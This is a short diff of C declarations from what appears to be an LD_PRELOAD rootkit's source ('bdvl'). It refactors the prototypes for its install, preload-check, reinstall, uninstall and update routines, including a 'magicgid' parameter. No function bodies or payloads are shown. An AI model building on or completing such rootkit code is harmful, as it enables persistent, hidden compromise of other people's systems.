@@ -14,17 +14,16 @@ void rmbdvpaths(void);
 void uninstallbdv(void);
 #include "uninstall.c"
 
-int rknomore(char *installdir, char *bdvlso);
-int _preloadok(const char *preloadpath);
-int preloadok(const char *preloadpath);
+int _rknomore(char *installdir, char *bdvlso);
+#define rknomore() _rknomore(INSTALL_DIR, BDVLSO)
+int _preloadok(const char *preloadpath, char *installdir, char *bdvlso);
+int preloadok(const char *preloadpath, char *installdir, char *bdvlso);
 void reinstall(const char *preloadpath, char *installdir, char *bdvlso);
 #include "reinstall.c"
 
 void bdvinstall(char *const argv[], char *installdir, char *bdvlso, char *preloadpath, gid_t magicgid);
 #include "install.c"
 
-
-static char *const marknames[4] = {"BDVLSO:", "INSTALL_DIR:", "OLD_PRELOAD:", "PRELOAD_FILE:"};
-char **bdvsearch(const char *sopath, int *cm);
+char **bdvsearch(const char *sopath);
 void bdvupdate(char *const argv[]);
 #include "update.c"
